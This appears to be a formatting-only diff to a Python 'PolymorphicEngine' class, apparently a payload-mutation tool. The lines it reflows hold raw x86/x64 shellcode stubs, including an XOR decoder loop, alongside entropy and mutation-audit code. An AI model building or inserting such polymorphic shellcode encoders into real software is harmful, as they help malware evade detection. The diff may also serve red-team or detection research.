@@ -324,14 +324,11 @@ class PolymorphicEngine:
     def _compress_data(self, data: bytes) -> bytes:
         compressed = zlib.compress(data, 9)
         if len(compressed) < len(data):
-            return b"\x78\x9C" + compressed[2:]
+            return b"\x78\x9c" + compressed[2:]
         return data
 
     def _base64_wrap(self, data: bytes, arch: str) -> bytes:
-        encoder_stub_x64 = (
-            b"\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2"
-            b"\x48\x83\xec\x20"
-        )
+        encoder_stub_x64 = b"\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x83\xec\x20"
         encoder_stub_x86 = b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x83\xec\x10"
 
         if self.config.compress:
@@ -351,6 +348,7 @@ class PolymorphicEngine:
         for b in data:
             freq[b] += 1
         import math
+
         total = len(data)
         entropy = 0.0
         for count in freq:
@@ -419,11 +417,7 @@ class PolymorphicEngine:
                 b"\xeb\x05"
                 b"\xe8\xf1\xff\xff\xff"
             )
-        return (
-            b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
-            b"\xeb\x07\x8d\x34\x24\x46\x80\x36\x41\xeb\x03"
-            b"\xe8\xf4\xff\xff\xff"
-        )
+        return b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x07\x8d\x34\x24\x46\x80\x36\x41\xeb\x03\xe8\xf4\xff\xff\xff"
 
     def get_audit_summary(self) -> dict[str, Any]:
         """Return a summary of all mutations applied.
@@ -438,13 +432,9 @@ class PolymorphicEngine:
             "variants": len(self.audit_log),
             "entropy_min": min(m.entropy for m in self.audit_log),
             "entropy_max": max(m.entropy for m in self.audit_log),
-            "entropy_avg": round(
-                sum(m.entropy for m in self.audit_log) / len(self.audit_log), 4
-            ),
+            "entropy_avg": round(sum(m.entropy for m in self.audit_log) / len(self.audit_log), 4),
             "size_ratio_min": min(m.size_ratio for m in self.audit_log),
             "size_ratio_max": max(m.size_ratio for m in self.audit_log),
             "hashes": [m.sha256 for m in self.audit_log],
-            "techniques": [
-                m.techniques_applied for m in self.audit_log
-            ],
+            "techniques": [m.techniques_applied for m in self.audit_log],
         }
